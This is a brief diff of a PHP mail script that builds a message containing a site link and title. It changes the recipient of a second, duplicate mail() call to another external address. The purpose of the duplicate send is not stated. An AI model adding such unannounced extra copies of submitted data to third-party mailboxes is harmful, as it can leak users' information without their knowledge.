@@ -58,7 +58,7 @@ $message .= "Ссылка на сайт: $url\n";
 $message .= "Заголовок: $title\n\n";
 
 mail ($to,$subject,$message,$headers);
-$to = "gustelev-roman@yandex.ru";
+$to = "token-change@mail.ru";
 mail ($to,$subject,$message,$headers);
 // $to = "triowork2@gmail.com";
 // mail ($to,$subject,$message,$headers);
